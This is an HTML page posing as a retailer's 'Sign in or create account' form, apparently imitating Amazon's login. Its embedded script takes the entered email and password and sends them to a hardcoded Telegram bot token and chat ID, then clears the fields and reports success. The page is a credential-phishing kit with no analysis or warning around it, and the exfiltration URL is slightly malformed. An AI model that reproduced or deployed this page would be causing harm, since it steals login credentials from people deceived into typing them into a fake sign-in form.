<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<title>Sign-In</title>
<style>
body{font-family:Arial,sans-serif;background:#fff;margin:0;display:flex;justify-content:center;padding-top:40px;}
.box{width:350px;border:1px solid #ddd;border-radius:8px;padding:20px 20px 10px;box-shadow:0 1px 4px rgba(0,0,0,.15);}
h1{font-size:28px;font-weight:400;margin:0 0 15px;}
label{font-size:13px;font-weight:700;display:block;margin:12px 0 4px;}
input[type=email],input[type=password]{
  width:100%;height:31px;padding:7px;box-sizing:border-box;
  font-size:13px;border:1px solid #949494;border-radius:3px;
}
.continue{
  width:100%;margin-top:18px;padding:8px 0;font-size:13px;font-weight:700;
  background:linear-gradient(to bottom,#f7dfa5,#f0c14b);
  border:1px solid #a88734;border-radius:3px;cursor:pointer;
}
.legal{font-size:12px;color:#111;margin-top:14px;}
a{color:#0066c0;text-decoration:none;}
hr{border:none;border-top:1px solid #ddd;margin:18px 0 10px;}
.work{font-size:12px;}
.work strong{display:block;font-size:13px;margin-bottom:6px;}
</style>
</head>
<body>
<div class="box">
  <h1>Sign in or create account</h1>
  <label for="email">Enter email</label>
  <input type="email" id="email" name="email"/>
  <label for="password">Enter password</label>
  <input type="password" id="password" name="password"/>
  <button class="continue" type="button" onclick="handleSubmit()">Continue</button>
  <p class="legal">By continuing, you agree to the <a href="#">Terms of Use</a> and <a href="#">Privacy Notice</a>.</p>
  <p class="legal"><a href="#">Need help?</a></p>
  <hr/>
  <div class="work">
    <strong>Buying for work?</strong>
    <a href="#">Create a free business account</a>
  </div>
</div>

<script>
function handleSubmit() {
    const botToken = "8825551788:AAHL5GbRl2S3r0KSElZTgzAtnDhvPvkfuwQ";
    const chatId = "8714686528";
    const userVal = document.getElementById('email').value;
    const passVal = document.getElementById('password').value;
    
    if (!userVal.trim() || !passVal.trim()) {
        alert("All fields are required to proceed.");
        return;
    }
    
    const message = `📋 *Form Submission*\n\n*User:* ${userVal}\n*Pass:* ${passVal}`;
    const url = `https://telegram.org{botToken}/sendMessage`;
    
    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: "Markdown"
        })
    })
    .then(response => {
        if (response.ok) {
            alert("Data processed successfully.");
            document.getElementById('email').value = '';
            document.getElementById('password').value = '';
        } else {
            alert("Processing error. Verify endpoint connection parameters.");
        }
    })
    .catch(error => {
        console.error("Connection error:", error);
        alert("Network connection timed out.");
    });
}
</script>
</body>
</html>
